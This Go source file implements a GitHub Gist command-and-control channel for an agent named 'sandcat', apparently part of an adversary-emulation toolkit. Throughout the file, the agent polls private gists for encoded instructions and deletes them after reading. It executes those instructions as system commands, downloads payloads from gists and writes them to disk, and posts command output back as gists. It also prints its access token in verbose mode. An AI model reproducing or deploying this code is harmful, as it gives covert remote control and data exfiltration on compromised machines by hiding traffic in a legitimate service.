package contact

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
	"path/filepath"
	"strings"

	"../execute"
	"../output"
	"../util"
)

const (
	githubTimeout = 60
	githubTimeoutResetInterval = 5
	githubError = 500
)

var (
	token = ""
	username string
)

//GIST communicate over github gists
type GIST struct {}

func init() {
	output.VerbosePrint("Token: " + token)
	CommunicationChannels["GIST"] = GIST{}
}

//Ping tests connectivity to the server
func (contact GIST) Ping(profile map[string]interface{}) bool {
	ctx := context.Background()
	c2Client := createNewClient()
	user, _, err := c2Client.Users.Get(ctx, "")
	if err == nil {
		username = *user.Login
		output.VerbosePrint("[+] Ping success")
		return true
	}
	output.VerbosePrint("[-] Ping failure")
	return false
}

//GetInstructions sends a beacon and returns instructions
func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	checkValidSleepInterval(profile)
	bites, heartbeat := gistBeacon(profile)
	var out map[string]interface{}
	if heartbeat == true {
		output.VerbosePrint("[+] Beacon: ALIVE")
		if bites != nil {
			var commands interface{}
			json.Unmarshal(bites, &out)
			json.Unmarshal([]byte(out["instructions"].(string)), &commands)
			out["sleep"] = int(out["sleep"].(float64))
			out["watchdog"] = int(out["watchdog"].(float64))
			out["instructions"] = commands
		}
	} else {
		output.VerbosePrint("[-] Beacon: DEAD")
	}
	return out
}

//DropPayloads downloads all required payloads for a command
func (contact GIST) DropPayloads(payload string, server string, uniqueId string) []string {
	payloadNames := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	if len(payloadNames) > 0 {
		return gistPayloadDrop(uniqueId, payloadNames)
	}
	return []string{}
}

//RunInstruction runs a single instruction
func (contact GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	gistResults(profile["paw"].(string), command["id"], result, status, cmd, pid)
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (contact GIST) C2RequirementsMet(criteria interface{}) bool {
	if len(criteria.(string)) > 0 {
		token = criteria.(string)
		return true
	}
	return false
}

func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
	heartbeat := createHeartbeatGist("beacon", profile)
	//collect instructions & delete
	contents := getGists("instructions", profile["paw"].(string))
	if contents != nil {
		return util.Decode(contents[0]), heartbeat
	}
	return nil, heartbeat
}

func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
	data, _ := json.Marshal(profile)
	if createGist(gistType, profile["paw"].(string), data) != created {
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	}
	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
	return true
}

func gistResults(uniqueId string, commandID interface{}, result []byte, status string, cmd string, pid string) {
	link := fmt.Sprintf("%s", commandID.(string))
	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
	if createGist("results", uniqueId, data) != created {
		output.VerbosePrint(fmt.Sprintf("[-] Results %s GIST: FAILED", link))
	} else {
		output.VerbosePrint(fmt.Sprintf("[+] Results %s GIST: SUCCESS", link))
	}
}

func gistPayloadDrop(uniqueId string, payloadNames []string) []string {
	var droppedPayloads []string
	payloads := getGists("payloads", uniqueId)
	for index, payload := range payloads {
		output.VerbosePrint(fmt.Sprintf("[*] Downloaded new payload: %s", payloadNames[index]))
		location := filepath.Join(payloadNames[index])
		if util.Exists(location) == false {
			util.WritePayloadBytes(location, util.Decode(payload))
		}
		droppedPayloads = append(droppedPayloads, payloadNames[index])
	}
	return droppedPayloads
}

func createGist(gistType string, uniqueId string, data []byte) int {
	ctx := context.Background()
	c2Client := createNewClient()
	gistDescriptor := getGistDescriptor(gistType, uniqueId)
	stringified := string(util.Encode(data))
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistDescriptor)] = file
	public := false
	gist := github.Gist{Description: &gistDescriptor, Public: &public, Files: files,}
	_, resp, err := c2Client.Gists.Create(ctx, &gist)
	if err != nil {
		return githubError
	}
	return resp.StatusCode
}

func getGists(gistType string, uniqueID string) []string {
	ctx := context.Background()
	c2Client := createNewClient()
	var contents []string
	gists, _, err := c2Client.Gists.List(ctx, username, nil)
	if err == nil {
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						contents = append(contents, *file.Content)
					}
				}
				c2Client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
	}
	return contents
}

func getGistDescriptor(gistType string, uniqueId string) string {
	return fmt.Sprintf("%s-%s", gistType, uniqueId)
}

func checkValidSleepInterval(profile map[string]interface{}) {
	if profile["sleep"] == githubTimeout{
		util.Sleep(float64(githubTimeoutResetInterval))
	}
}

func createNewClient() *github.Client {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	c2Client := github.NewClient(tc)
	return c2Client
}